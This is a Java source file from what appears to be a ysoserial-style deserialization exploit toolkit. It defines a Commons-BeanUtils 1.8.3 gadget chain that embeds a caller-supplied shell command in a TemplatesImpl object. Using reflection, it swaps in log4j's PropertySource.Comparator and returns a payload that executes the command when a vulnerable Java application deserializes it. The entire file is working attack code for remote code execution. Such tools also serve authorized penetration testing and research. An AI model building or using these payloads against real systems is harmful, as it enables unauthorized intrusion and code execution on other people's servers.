package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.logging.log4j.util.PropertySource;

import java.util.Comparator;

import static com.qi4l.JYso.gadgets.cb_AttrCompare183.getCbSink_3;

@SuppressWarnings({"rawtypes", "unused"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
@Authors({"SummerSec"})
public class cb_PropertySource183 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        PropertySource propertySource1 = () -> 0;

        Comparator beanComparator = cb_AttrCompare183.getCbSink_2();
        Reflections.setFieldValue(beanComparator, "comparator", new PropertySource.Comparator());

        return getCbSink_3(beanComparator, propertySource1, template);
    }
}
